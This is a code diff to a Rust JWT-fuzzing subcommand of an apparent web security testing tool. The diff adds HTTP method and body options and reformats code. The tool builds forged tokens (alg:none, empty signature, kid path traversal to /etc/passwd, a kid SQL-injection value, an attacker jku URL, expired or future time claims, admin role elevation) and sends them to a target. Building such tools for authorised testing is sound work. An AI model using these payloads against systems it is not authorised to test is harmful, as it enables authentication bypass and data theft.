@@ -77,6 +77,20 @@ pub struct JwtDiffArgs {
     #[arg(long, short = 'H', value_name = "HEADER", num_args = 0..)]
     pub header: Vec<String>,
 
+    /// HTTP method to use for both baseline + probes. JWT-protected
+    /// endpoints are commonly POST (GraphQL mutations, REST writes);
+    /// the GET default was silently returning 405/404 on those and
+    /// the diff falsely reported "no divergence" — not because the
+    /// server validated the JWT correctly, but because every probe
+    /// was the wrong shape. Accepts any HTTP method name.
+    #[arg(long, default_value = "GET", value_name = "METHOD")]
+    pub method: String,
+
+    /// Optional request body for non-GET methods. Sent verbatim;
+    /// pair with `-H 'Content-Type: ...'` if the endpoint needs it.
+    #[arg(long, value_name = "BODY")]
+    pub body: Option<String>,
+
     /// Output format: `text` (default) or `json`.
     #[arg(long, default_value = "text", value_parser = ["text", "json"])]
     pub format: String,
@@ -126,15 +140,13 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── alg:none family ──
     out.push(JwtProbe {
         kind: "alg-none-lowercase",
-        description:
-            "alg:`none` — strips signature; server that skips sig check on \
+        description: "alg:`none` — strips signature; server that skips sig check on \
              alg:none accepts a freely-modified payload",
         mutated_token: build_jwt(&with_alg(&header, "none"), &payload, ""),
     });
     out.push(JwtProbe {
         kind: "alg-none-capital",
-        description:
-            "alg:`None` — case-fold confusion; libraries that string-compare \
+        description: "alg:`None` — case-fold confusion; libraries that string-compare \
              alg case-sensitively reject lowercase but accept the variant",
         mutated_token: build_jwt(&with_alg(&header, "None"), &payload, ""),
     });
@@ -152,8 +164,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Empty signature with original alg preserved ──
     out.push(JwtProbe {
         kind: "empty-sig-original-alg",
-        description:
-            "alg preserved (e.g. HS256) but signature segment is empty — \
+        description: "alg preserved (e.g. HS256) but signature segment is empty — \
              servers that look only at header.alg before verifying sig may \
              accept",
         mutated_token: build_jwt(&header, &payload, ""),
@@ -162,8 +173,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── kid traversal ──
     out.push(JwtProbe {
         kind: "kid-path-traversal",
-        description:
-            "`kid` header field set to `../../../etc/passwd` — servers that \
+        description: "`kid` header field set to `../../../etc/passwd` — servers that \
              use kid as a path to look up keys may read arbitrary files",
         mutated_token: build_jwt(
             &with_field(&header, "kid", json!("../../../etc/passwd")),
@@ -173,8 +183,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     });
     out.push(JwtProbe {
         kind: "kid-sql-injection",
-        description:
-            "`kid` SQL-payload — servers that look up kid in a DB without \
+        description: "`kid` SQL-payload — servers that look up kid in a DB without \
              parameterisation are vulnerable",
         mutated_token: build_jwt(
             &with_field(&header, "kid", json!("x' UNION SELECT 'secret'--")),
@@ -186,8 +195,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── jku / x5u attacker-URL ──
     out.push(JwtProbe {
         kind: "jku-attacker-url",
-        description:
-            "`jku` header set to attacker-hosted JWK set URL — servers that \
+        description: "`jku` header set to attacker-hosted JWK set URL — servers that \
              fetch keys from operator-controlled URLs accept attacker-signed \
              tokens",
         mutated_token: build_jwt(
@@ -200,8 +208,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Expired exp ──
     out.push(JwtProbe {
         kind: "expired-exp",
-        description:
-            "`exp` claim set to a date 10 years in the past — servers that \
+        description: "`exp` claim set to a date 10 years in the past — servers that \
              don't validate exp accept stale tokens forever",
         mutated_token: build_jwt(
             &header,
@@ -213,8 +220,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Future nbf ──
     out.push(JwtProbe {
         kind: "future-nbf",
-        description:
-            "`nbf` (not-before) claim set to far future — servers that don't \
+        description: "`nbf` (not-before) claim set to far future — servers that don't \
              validate nbf accept tokens that 'aren't valid yet'",
         mutated_token: build_jwt(
             &header,
@@ -226,8 +232,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Privilege escalation in payload ──
     out.push(JwtProbe {
         kind: "role-elevation",
-        description:
-            "Set common admin fields (`role:admin`, `is_admin:true`, \
+        description: "Set common admin fields (`role:admin`, `is_admin:true`, \
              `permissions:[\"*\"]`) in the payload — servers that don't \
              validate sig let the elevated token through",
         mutated_token: {
@@ -241,7 +246,8 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     out
 }
 
-pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
+pub async fn run_jwt_diff(mut args: JwtDiffArgs) -> ExitCode {
+    args.url = crate::helpers::normalize_target_url(&args.url);
     if args.token.split('.').count() != 3 {
         eprintln!(
             "{} --token does not look like a JWT (must be `<header>.<payload>.<signature>`)",
@@ -249,7 +255,7 @@ pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
         );
         return ExitCode::from(2);
     }
-    let http = match build_http_client(&args) {
+    let http = match crate::parser_diff_common::build_diff_http_client_for(&args) {
         Ok(c) => c,
         Err(code) => return code,
     };
@@ -258,12 +264,19 @@ pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
         eprintln!(
             "{} probing {} JWT mutations against {}",
             "[wafrift jwt-diff]".bright_cyan().bold(),
-            generate_jwt_variants(&args.token).len().to_string().bold().yellow(),
+            generate_jwt_variants(&args.token)
+                .len()
+                .to_string()
+                .bold()
+                .yellow(),
             args.url.bright_white()
         );
     }
 
-    let baseline = match fire_with_bearer(&http, &args.url, &args.token).await {
+    let baseline =
+        match fire_with_bearer(&http, &args.url, &args.method, args.body.as_deref(), &args.token)
+            .await
+        {
         Ok(v) => v,
         Err(e) => {
             eprintln!(
@@ -287,6 +300,8 @@ pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
     let sem = Arc::new(Semaphore::new(args.concurrency.max(1)));
     let http_arc = Arc::new(http);
     let url_arc = Arc::new(args.url.clone());
+    let method_arc = Arc::new(args.method.clone());
+    let body_arc = Arc::new(args.body.clone());
     let counter = Arc::new(AtomicUsize::new(0));
 
     let mut handles = Vec::with_capacity(variants.len());
@@ -294,6 +309,8 @@ pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
         let permit = sem.clone().acquire_owned().await.unwrap();
         let http = http_arc.clone();
         let url = url_arc.clone();
+        let method = method_arc.clone();
+        let body = body_arc.clone();
         let counter = counter.clone();
         let delay = Duration::from_millis(args.delay_ms);
         handles.push(tokio::spawn(async move {
@@ -301,7 +318,14 @@ pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
             if !delay.is_zero() {
                 tokio::time::sleep(delay).await;
             }
-            let result = fire_with_bearer(&http, &url, &v.mutated_token).await;
+            let result = fire_with_bearer(
+                &http,
+                &url,
+                &method,
+                body.as_deref(),
+                &v.mutated_token,
+            )
+            .await;
             counter.fetch_add(1, Ordering::SeqCst);
             (v, result)
         }));
@@ -348,27 +372,25 @@ pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
 async fn fire_with_bearer(
     http: &Client,
     url: &str,
+    method: &str,
+    body: Option<&str>,
     token: &str,
 ) -> Result<(u16, usize), String> {
-    let resp = http
-        .get(url)
-        .header("Authorization", format!("Bearer {token}"))
-        .send()
-        .await
-        .map_err(|e| format!("{e}"))?;
+    let method = reqwest::Method::from_bytes(method.as_bytes())
+        .map_err(|e| format!("invalid method {method:?}: {e}"))?;
+    let mut req = http
+        .request(method, url)
+        .header("Authorization", format!("Bearer {token}"));
+    if let Some(b) = body {
+        req = req.body(b.to_string());
+    }
+    let resp = req.send().await.map_err(|e| format!("{e}"))?;
     let status = resp.status().as_u16();
     let body = resp.bytes().await.map_err(|e| format!("{e}"))?;
     Ok((status, body.len()))
 }
 
-fn build_http_client(args: &JwtDiffArgs) -> Result<Client, ExitCode> {
-    crate::parser_diff_common::build_diff_http_client(
-        args.timeout_secs,
-        args.insecure,
-        args.proxy.as_deref(),
-        &args.header,
-    )
-}
+crate::impl_parser_diff_http_args!(JwtDiffArgs);
 
 fn render_curl(url: &str, token: &str) -> String {
     format!(
@@ -442,9 +464,8 @@ fn emit_output(
 /// Encode bytes as URL-safe base64 WITHOUT padding (per RFC 7515
 /// §2 — JWS uses unpadded base64url throughout).
 fn b64url_encode(bytes: &[u8]) -> String {
-    const ALPHABET: &[u8; 64] =
-        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
-    let mut out = String::with_capacity((bytes.len() * 4 + 2) / 3);
+    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
+    let mut out = String::with_capacity((bytes.len() * 4).div_ceil(3));
     let mut i = 0;
     while i + 3 <= bytes.len() {
         let b0 = bytes[i] as u32;
@@ -520,7 +541,11 @@ fn decode_b64url_json(s: &str) -> Option<Value> {
 
 fn build_jwt(header: &Value, payload: &Value, sig: &str) -> String {
     let h = b64url_encode(serde_json::to_string(header).unwrap_or_default().as_bytes());
-    let p = b64url_encode(serde_json::to_string(payload).unwrap_or_default().as_bytes());
+    let p = b64url_encode(
+        serde_json::to_string(payload)
+            .unwrap_or_default()
+            .as_bytes(),
+    );
     format!("{h}.{p}.{sig}")
 }
 
@@ -692,7 +717,10 @@ mod tests {
     #[test]
     fn generate_jwt_variants_role_elevation_carries_admin_claims() {
         let v = generate_jwt_variants(&valid_baseline_jwt());
-        let probe = v.iter().find(|p| p.kind == "role-elevation").expect("probe");
+        let probe = v
+            .iter()
+            .find(|p| p.kind == "role-elevation")
+            .expect("probe");
         let parts: Vec<&str> = probe.mutated_token.split('.').collect();
         let payload = decode_b64url_json(parts[1]).expect("decode");
         assert_eq!(payload["role"], "admin");
@@ -712,7 +740,10 @@ mod tests {
     #[test]
     fn generate_jwt_variants_jku_attacker_url_uses_attacker_domain() {
         let v = generate_jwt_variants(&valid_baseline_jwt());
-        let probe = v.iter().find(|p| p.kind == "jku-attacker-url").expect("probe");
+        let probe = v
+            .iter()
+            .find(|p| p.kind == "jku-attacker-url")
+            .expect("probe");
         let parts: Vec<&str> = probe.mutated_token.split('.').collect();
         let header = decode_b64url_json(parts[0]).expect("decode");
         let jku = header["jku"].as_str().expect("jku");
@@ -744,6 +775,8 @@ mod tests {
             insecure: false,
             proxy: None,
             header: Vec::new(),
+            method: "GET".into(),
+            body: None,
             format: "json".into(),
             quiet: true,
         };
@@ -806,6 +839,8 @@ mod tests {
             insecure: false,
             proxy: None,
             header: Vec::new(),
+            method: "GET".into(),
+            body: None,
             format: "json".into(),
             quiet: true,
         };
@@ -824,6 +859,8 @@ mod tests {
             insecure: false,
             proxy: None,
             header: Vec::new(),
+            method: "GET".into(),
+            body: None,
             format: "json".into(),
             quiet: true,
         };
